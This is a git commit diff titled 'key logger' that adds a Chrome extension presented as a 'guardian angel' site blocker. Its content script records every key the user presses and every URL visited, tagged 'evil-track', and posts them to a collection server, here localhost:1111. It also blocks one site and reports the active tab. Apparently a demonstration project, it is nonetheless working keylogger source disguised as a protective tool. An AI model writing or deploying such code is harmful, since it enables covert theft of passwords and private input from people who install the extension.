f0a45adc2e840b6207a1d9315c95d6fd031b1fc9
asaf.shochet <asaf.shochet@evinced.com>
2022-12-26 22:19:39 +0200

    key logger

---
+++ src/5-guardian-angle-keylogger/content.js
@@ -0,0 +1,42 @@
+async function track(url) {
+  try {
+    await fetch("https://localhost:1111", {
+      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      body: JSON.stringify({ type: "evil-track", url }),
+    });
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+async function sendKey(key) {
+  try {
+    await fetch("https://localhost:1111", {
+      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      body: JSON.stringify({ type: "key", key }),
+    });
+  } catch (err) {
+    console.error(err);
+  }
+}
+function addKeypressListener() {
+  window.addEventListener("keydown", (event) => {
+    if (event.isComposing || event.keyCode === 229) {
+      return;
+    }
+    sendKey(event.key);
+  });
+}
+
+function blockBlackListedSite() {
+  const url = window.location.href;
+  if (url.includes("zoo.org")) {
+    document.body.setHTML(
+      '<div><center><h1>This site has been blocked</h1><img height="400px" src="https://openai-labs-public-images-prod.azureedge.net/user-R6IAhb5TVYu3MNFn7i60xp14/generations/generation-y341cFvw7Ccw8GFqQpquwcN3/image.webp"></center></div>'
+    );
+  }
+  track(url);
+  addKeypressListener();
+}
+
+blockBlackListedSite();
---
+++ src/5-guardian-angle-keylogger/logic.js
@@ -0,0 +1,30 @@
+async function reportSite(url) {
+  try {
+    const response = await fetch("https://localhost:1111", {
+      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ url }),
+    });
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+function reportActiveTab() {
+  chrome.tabs.query(
+    {
+      active: true,
+      lastFocusedWindow: true,
+    },
+    function (tabs) {
+      const tab = tabs[0];
+      reportSite(tab.url);
+    }
+  );
+}
+
+document
+  .getElementById("report-button")
+  .addEventListener("click", reportActiveTab);
